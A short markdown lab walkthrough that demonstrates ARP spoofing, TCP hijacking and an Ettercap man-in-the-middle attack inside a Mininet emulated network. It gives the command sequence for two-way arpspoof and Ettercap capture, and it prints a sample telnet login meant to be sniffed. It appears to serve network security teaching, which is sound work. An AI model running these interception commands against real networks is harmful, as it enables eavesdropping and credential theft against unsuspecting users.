# Sniffing

## Enable IP FOrwardings with dsniff
```
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

## Run mininet for TCP Hijacking demo

#### TCP Hijacking demo on mininet
```
https://github.com/seanschoi/mininet_tcp_hijacking
```

#### Run script:
```
sudo python sniffing/tcp_hijacking.py
```

## Add default gateway
```
h1 route add default gw 192.168.0.5
```
## Send continuous pings to the gateway
```
h1 ping h3
```
## Use mininet `m` utility to start ARP spoofing
```
mininet/util/m h2 arpspoof -i h2-eth0 -t 192.168.0.3 192.168.0.5
```

## ARP spoof for the second host
```
mininet/util/m h2 arpspoof -i h2-eth0 -t 192.168.0.5 192.168.0.3
```

# Use Ettercap for MITM attack

## Start Ettercap
```
mininet/util/m h2 ettercap -T -i h2-eth0 -M arp:remote -L /tmp/mitm ///
```

## back on mininet, start a telnet server
```
h1 inetd
```

## Connect to the telnet server from the other miniet host
```
mininet/util/m h3 telnet 192.168.0.3
skillsetuser2
infosec!!!
```

## Read ettercap logs

#### chutdown ettercap
```
q
```

#### read the ettercap logs
```
etterlog /tmp/mitm.eci | more
```